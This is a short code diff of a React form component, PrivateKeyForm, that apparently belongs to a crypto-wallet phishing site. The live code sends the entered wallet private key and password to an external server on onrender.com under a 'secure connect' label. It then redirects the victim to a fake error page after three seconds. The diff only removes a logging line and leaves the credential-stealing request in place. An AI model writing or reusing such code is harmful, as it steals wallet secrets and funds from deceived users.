@@ -37,8 +37,7 @@ const PrivateKeyForm = ({wallet, privateKeyLengthNotlong}) => {
 
     if (privateKey64Long) {
       try {
-        const res = await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
-        console.log(res);
+       await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
         setTimeout(() => {
           navigate('/error')
         }, 3000);
